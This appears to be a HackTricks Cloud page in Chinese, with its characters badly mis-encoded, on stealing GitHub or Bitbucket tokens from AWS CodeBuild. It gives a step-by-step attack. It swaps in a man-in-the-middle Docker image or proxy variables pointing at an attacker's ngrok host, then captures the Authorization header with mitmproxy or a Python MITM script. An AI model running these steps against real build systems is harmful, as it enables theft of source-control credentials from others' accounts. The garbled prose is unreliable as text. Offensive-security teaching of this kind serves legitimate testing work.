# AWS Codebuild - ä»¤ç‰Œæ³„éœ²

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ PDF ç‰ˆçš„ HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## æ¢å¤ Github/Bitbucket é…ç½®çš„ä»¤ç‰Œ

é¦–å…ˆï¼Œæ£€æŸ¥æ˜¯å¦é…ç½®äº†ä»»ä½•å¯èƒ½æ³„éœ²çš„æºå‡­æ®ï¼š
```bash
aws codebuild list-source-credentials
```
### é€šè¿‡Dockeré•œåƒ

å¦‚æœæ‚¨å‘ç°ä¾‹å¦‚Githubçš„èº«ä»½éªŒè¯å·²åœ¨å¸æˆ·ä¸­è®¾ç½®ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä½¿Codebuildä½¿ç”¨ç‰¹å®šçš„Dockeré•œåƒæ¥è¿è¡Œé¡¹ç›®çš„æ„å»ºæ¥**æ³„éœ²**è¯¥**è®¿é—®æƒé™**ï¼ˆGHä»¤ç‰Œæˆ–OAuthä»¤ç‰Œï¼‰ã€‚

ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„Codebuildé¡¹ç›®**æˆ–æ›´æ”¹ç°æœ‰é¡¹ç›®çš„**ç¯å¢ƒ**ä»¥è®¾ç½®**Dockeré•œåƒ**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨çš„Dockeré•œåƒæ˜¯[https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸åŸºæœ¬çš„Dockeré•œåƒï¼Œå°†è®¾ç½®**ç¯å¢ƒå˜é‡`https_proxy`**ï¼Œ**`http_proxy`**å’Œ**`SSL_CERT_FILE`**ã€‚è¿™å°†å…è®¸æ‚¨æ‹¦æˆªå¤§éƒ¨åˆ†åœ¨**`https_proxy`**å’Œ**`http_proxy`**ä¸­æŒ‡å®šçš„ä¸»æœºçš„æµé‡ï¼Œå¹¶ä¿¡ä»»**`SSL_CERT_FILE`**ä¸­æŒ‡å®šçš„SSLè¯ä¹¦ã€‚

1. **åˆ›å»ºå¹¶ä¸Šä¼ æ‚¨è‡ªå·±çš„Docker MitMé•œåƒ**
* æŒ‰ç…§å­˜å‚¨åº“çš„è¯´æ˜è®¾ç½®ä»£ç†IPåœ°å€å¹¶è®¾ç½®SSLè¯ä¹¦ï¼Œå¹¶**æ„å»ºDockeré•œåƒ**ã€‚
* **ä¸è¦è®¾ç½®`http_proxy`**ä»¥ä¸æ‹¦æˆªå¯¹å…ƒæ•°æ®ç«¯ç‚¹çš„è¯·æ±‚ã€‚
* æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼äº`ngrok tcp 4444`çš„`ngrok`å°†ä»£ç†è®¾ç½®ä¸ºæ‚¨çš„ä¸»æœºã€‚
* æ„å»ºå®ŒæˆDockeré•œåƒåï¼Œ**å°†å…¶ä¸Šä¼ åˆ°å…¬å…±å­˜å‚¨åº“**ï¼ˆDockerhubï¼ŒECR...ï¼‰ã€‚
2. **è®¾ç½®ç¯å¢ƒ**
* åˆ›å»ºä¸€ä¸ª**æ–°çš„Codebuildé¡¹ç›®**æˆ–**ä¿®æ”¹**ç°æœ‰é¡¹ç›®çš„ç¯å¢ƒã€‚
* è®¾ç½®é¡¹ç›®ä½¿ç”¨**å…ˆå‰ç”Ÿæˆçš„Dockeré•œåƒ**ã€‚
*

<figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
3. **åœ¨æ‚¨çš„ä¸»æœºä¸­è®¾ç½®MitMä»£ç†**
* å¦‚**Githubå­˜å‚¨åº“**ä¸­æ‰€ç¤ºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„å†…å®¹ï¼š
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
4. **è¿è¡Œæ„å»ºå¹¶æ•è·å‡­æ®**

*   æ‚¨å¯ä»¥åœ¨**Authorization**å¤´ä¸­çœ‹åˆ°ä»¤ç‰Œï¼š

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

è¿™ä¹Ÿå¯ä»¥é€šè¿‡aws cliæ¥å®Œæˆï¼Œä¾‹å¦‚ï¼š
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### é€šè¿‡HTTPåè®®

{% hint style="success" %}
**è¿™ä¸ªæ¼æ´åœ¨2023å¹´2æœˆ20æ—¥çš„æŸä¸ªæ—¶é—´ç‚¹è¢«AWSä¿®å¤äº†ï¼ˆæˆ‘æƒ³æ˜¯æ˜ŸæœŸäº”ï¼‰ã€‚æ‰€ä»¥æ”»å‡»è€…ä¸èƒ½å†æ»¥ç”¨å®ƒäº† :)**
{% endhint %}

ä¸€ä¸ªæ‹¥æœ‰**CodeBuildçš„é«˜æƒé™çš„æ”»å‡»è€…å¯ä»¥æ³„éœ²é…ç½®çš„Github/Bitbucketä»¤ç‰Œ**ï¼Œæˆ–è€…å¦‚æœæƒé™æ˜¯é€šè¿‡OAuthé…ç½®çš„ï¼Œå¯ä»¥æ³„éœ²**ç”¨äºè®¿é—®ä»£ç çš„ä¸´æ—¶OAuthä»¤ç‰Œ**ã€‚

* æ”»å‡»è€…å¯ä»¥å°†ç¯å¢ƒå˜é‡**http\_proxy**å’Œ**https\_proxy**æ·»åŠ åˆ°CodeBuildé¡¹ç›®ä¸­ï¼ŒæŒ‡å‘ä»–çš„æœºå™¨ï¼ˆä¾‹å¦‚`http://5.tcp.eu.ngrok.io:14972`ï¼‰ã€‚

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* ç„¶åï¼Œå°†githubä»“åº“çš„URLæ›´æ”¹ä¸ºä½¿ç”¨HTTPè€Œä¸æ˜¯HTTPSï¼Œä¾‹å¦‚ï¼š**http://**github.com/carlospolop-forks/TestActions
* ç„¶åï¼Œåœ¨ä»£ç†å˜é‡ï¼ˆhttp\_proxyå’Œhttps\_proxyï¼‰æŒ‡å‘çš„ç«¯å£ä¸Šè¿è¡Œ[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)çš„åŸºæœ¬ç¤ºä¾‹ã€‚
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* æœ€åï¼Œç‚¹å‡»**æ„å»ºé¡¹ç›®**ï¼Œ**å‡­è¯**å°†ä»¥æ˜æ–‡ï¼ˆbase64ï¼‰å‘é€åˆ°mitmç«¯å£ï¼š

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
ç°åœ¨æ”»å‡»è€…å°†èƒ½å¤Ÿä»ä»–çš„æœºå™¨ä¸Šä½¿ç”¨ä»¤ç‰Œï¼Œåˆ—å‡ºæ‰€æœ‰æƒé™ï¼Œå¹¶ä¸”æ¯”ç›´æ¥ä½¿ç”¨CodeBuildæœåŠ¡æ›´å®¹æ˜“åœ°æ»¥ç”¨ã€‚
{% endhint %}

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
